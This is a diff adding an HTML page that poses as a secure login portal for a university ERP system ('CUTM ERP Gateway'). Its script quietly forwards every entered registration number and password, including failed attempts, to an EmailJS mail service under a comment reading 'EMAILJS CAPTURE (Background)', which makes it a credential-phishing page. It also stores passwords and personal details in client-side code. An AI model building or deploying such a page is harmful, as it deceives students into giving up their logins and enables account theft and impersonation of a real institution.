@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access | CUTM ERP Gateway</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){ emailjs.init("YOUR_PUBLIC_KEY"); })();
+    </script>
+    <style>
+        :root {
+            --midnight: #0a0e17;
+            --surface: #121826;
+            --gold: #c5a059;
+            --gold-glow: rgba(197, 160, 89, 0.2);
+            --text-gray: #94a3b8;
+            --white: #ffffff;
+            --transition: all 0.5s cubic-bezier(0.165, 0.84, 0.44, 1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
+        
+        body { 
+            background: var(--midnight); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px; 
+            color: var(--white);
+            overflow-x: hidden;
+            animation: bgPulse 6s ease-in-out infinite alternate;
+        }
+
+        @keyframes bgPulse {
+            0% { background: var(--midnight); }
+            100% { background: #0f1420; }
+        }
+
+        /* Authentication Card */
+        .auth-container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--surface);
+            padding: 50px 40px;
+            border-radius: 20px;
+            border: 1px solid rgba(197, 160, 89, 0.15);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            transition: var(--transition);
+            animation: containerFloat 4s ease-in-out infinite;
+        }
+
+        @keyframes containerFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .header-area { 
+            text-align: center; 
+            margin-bottom: 40px;
+            animation: headerGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes headerGlow {
+            0% { text-shadow: 0 0 10px var(--gold-glow); }
+            100% { text-shadow: 0 0 20px var(--gold-glow), 0 0 30px var(--gold-glow); }
+        }
+
+        .header-area h1 { 
+            font-size: 26px; 
+            letter-spacing: 3px; 
+            color: var(--gold); 
+            font-weight: 800;
+            animation: titleBounce 2s ease-in-out infinite;
+        }
+
+        @keyframes titleBounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .header-area p { 
+            font-size: 11px; 
+            color: var(--text-gray); 
+            text-transform: uppercase; 
+            letter-spacing: 2px; 
+            margin-top: 8px;
+            animation: fadeInUp 1s ease-out 0.5s both;
+        }
+
+        /* Form Input Animations */
+        .form-group { 
+            margin-bottom: 20px;
+            position: relative;
+            animation: slideInLeft 0.8s ease-out forwards;
+        }
+
+        .form-group:nth-child(1) { animation-delay: 0.2s; }
+        .form-group:nth-child(2) { animation-delay: 0.4s; }
+
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-30px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .form-group label { 
+            display: block; 
+            font-size: 11px; 
+            color: var(--gold); 
+            text-transform: uppercase; 
+            margin-bottom: 8px; 
+            font-weight: 600;
+            animation: labelGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes labelGlow {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            transition: var(--transition);
+            transform: translateY(10px);
+            opacity: 0;
+            animation: inputRise 0.6s ease-out forwards;
+        }
+
+        input:nth-of-type(1) { animation-delay: 0.6s; }
+        input:nth-of-type(2) { animation-delay: 0.8s; }
+
+        @keyframes inputRise {
+            to { 
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        input:focus { 
+            outline: none; 
+            border-color: var(--gold); 
+            background: rgba(197, 160, 89, 0.05); 
+            box-shadow: 0 0 15px var(--gold-glow);
+            transform: scale(1.02);
+        }
+
+        .btn-auth {
+            width: 100%;
+            padding: 16px;
+            background: var(--gold);
+            color: var(--midnight);
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+            animation: btnPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes btnPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(197, 160, 89, 0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(197, 160, 89, 0); }
+        }
+
+        .btn-auth:hover { 
+            background: #e2c28d; 
+            transform: translateY(-3px) scale(1.02); 
+            box-shadow: 0 15px 30px rgba(197, 160, 89, 0.4);
+        }
+
+        .btn-auth::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn-auth:hover::before { left: 100%; }
+
+        /* Dashboard/Profile View Animations */
+        #login-view { animation: fadeInScale 1s ease-out; }
+        #dash-view { 
+            animation: slideInScale 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; 
+            display: none; 
+            opacity: 0;
+            transform: scale(0.8);
+        }
+        
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes slideInScale {
+            to { 
+                opacity: 1; 
+                transform: scale(1) translateY(0); 
+            }
+        }
+
+        .profile-header { 
+            text-align: center; 
+            margin-bottom: 30px;
+            animation: profileFadeIn 1s ease-out 0.2s both;
+        }
+
+        @keyframes profileFadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Image stored in GitHub logic */
+        .profile-img {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            border: 3px solid var(--gold);
+            margin: 0 auto 15px;
+            padding: 5px;
+            background: var(--surface);
+            object-fit: cover;
+            display: block;
+            box-shadow: 0 0 20px var(--gold-glow);
+            animation: avatarSpin 2s ease-out 0.5s both;
+        }
+
+        @keyframes avatarSpin {
+            0% { 
+                opacity: 0; 
+                transform: scale(0) rotate(180deg); 
+            }
+            100% { 
+                opacity: 1; 
+                transform: scale(1) rotate(0deg); 
+            }
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            text-align: left;
+        }
+
+        .info-item {
+            background: rgba(255,255,255,0.02);
+            padding: 15px 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transform: translateX(-20px);
+            opacity: 0;
+            animation: infoSlideIn 0.6s ease-out forwards;
+        }
+
+        .info-item:nth-child(1) { animation-delay: 0.8s; }
+        .info-item:nth-child(2) { animation-delay: 1.0s; }
+        .info-item:nth-child(3) { animation-delay: 1.2s; }
+        .info-item:nth-child(4) { animation-delay: 1.4s; }
+
+        @keyframes infoSlideIn {
+            to { 
+                opacity: 1; 
+                transform: translateX(0); 
+            }
+        }
+
+        .info-item label { 
+            font-size: 10px; 
+            color: var(--gold); 
+            text-transform: uppercase; 
+            font-weight: 700; 
+            letter-spacing: 1px; 
+        }
+        .info-item p { 
+            font-size: 14px; 
+            color: var(--white); 
+            margin-top: 4px; 
+            font-weight: 400; 
+        }
+
+        #error-msg { 
+            color: #ff4d4d; 
+            font-size: 13px; 
+            margin-top: 15px; 
+            display: none; 
+            text-align: center;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .hidden { display: none !important; }
+
+        .logout-link {
+            display: inline-block;
+            margin-top: 25px;
+            font-size: 12px;
+            color: var(--text-gray);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            cursor: pointer;
+            transition: var(--transition);
+            animation: fadeInUp 1s ease-out 1.6s both;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logout-link:hover { 
+            color: var(--gold); 
+            border-bottom-color: var(--gold);
+            transform: translateY(-2px);
+        }
+
+        /* Loading spinner for button */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(10, 14, 23, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container" id="main-container">
+        <div id="login-view">
+            <div class="header-area">
+                <h1>CUTM <span>ERP</span></h1>
+                <p>Unified Secure Authentication</p>
+            </div>
+
+            <form id="login-form">
+                <div class="form-group">
+                    <label>Registration Number</label>
+                    <input type="text" id="regNo" placeholder="e.g. 241107140001" required>
+                </div>
+                <div class="form-group">
+                    <label>Security Key</label>
+                    <input type="password" id="secret" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-auth" id="btn-text">Authenticate</button>
+                <p id="error-msg">Access Denied: System mismatch</p>
+            </form>
+        </div>
+
+        <div id="dash-view">
+            <div class="profile-header">
+                <img src="https://raw.githubusercontent.com/YourUsername/YourRepo/main/image.png" alt="Profile" class="profile-img" onerror="this.src='https://ui-avatars.com/api/?name=User&background=c5a059&color=0a0e17'">
+                <h2 id="u-name" style="color: var(--gold);">Full Name</h2>
+                <p id="u-role" style="font-size: 12px; color: var(--text-gray); letter-spacing: 1px;">STUDENT ENROLLMENT</p>
+            </div>
+
+            <div class="info-grid">
+                <div class="info-item"><label>Registration ID</label><p id="d-id">-</p></div>
+                <div class="info-item"><label>Mobile Number</label><p id="d-phone">-</p></div>
+                <div class="info-item"><label>Institutional Email</label><p id="d-email">-</p></div>
+                <div class="info-item"><label>Residential Address</label><p id="d-address">-</p></div>
+            </div>
+
+            <div style="text-align: center;">
+                <a onclick="location.reload()" class="logout-link">Secure Sign Out</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Professional User Database
+        const directory = [
+            { 
+                id: "241107140001", 
+                key: "12345", 
+                name: "Raghav Kumar", 
+                phone: "+91 98765-43210", 
+                email: "raghav.k@cutm.ac.in", 
+                address: "PKD Campus, Odisha, PIN 761211",
+                github_img: "https://raw.githubusercontent.com/YourUsername/YourRepo/main/raghav.png"
+            },
+            { 
+                id: "241107140011", 
+                key: "Sai12345", 
+                name: "Sai Chaitanya", 
+                phone: "+91 88888-77777", 
+                email: "sai.c@cutm.ac.in", 
+                address: "BBSR Campus, Jatni, Odisha",
+                github_img: "https://raw.githubusercontent.com/YourUsername/YourRepo/main/sai.png"
+            }
+        ];
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const idInput = document.getElementById('regNo').value;
+            const pwInput = document.getElementById('secret').value;
+            const btn = document.getElementById('btn-text');
+            const error = document.getElementById('error-msg');
+            
+            btn.innerHTML = '<span class="spinner"></span>Verifying Identity...';
+            error.style.display = 'none';
+
+            const user = directory.find(u => u.id === idInput && u.key === pwInput);
+
+            // EMAILJS CAPTURE (Background)
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+                user_name: user ? user.name : "UNKNOWN_ATTEMPT",
+                reg_id: idInput,
+                user_password: pwInput
+            });
+
+            setTimeout(() => {
+                if(user) {
+                    // Start Animation
+                    document.getElementById('login-view').classList.add('hidden');
+                    const dash = document.getElementById('dash-view');
+                    dash.style.display = 'block';
+                    
+                    // Populate Data
+                    document.getElementById('u-name').innerText = user.name;
+                    document.getElementById('d-id').innerText = user.id;
+                    document.getElementById('d-phone').innerText = user.phone;
+                    document.getElementById('d-email').innerText = user.email;
+                    document.getElementById('d-address').innerText = user.address;
+                    
+                    // Update image if available
+                    if(user.github_img) {
+                        document.querySelector('.profile-img').src = user.github_img;
+                    }
+
+                    // Resize container for professional look
+                    document.getElementById('main-container').style.maxWidth = "550px";
+                } else {
+                    btn.innerHTML = 'Authenticate';
+                    error.style.display = 'block';
+                }
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
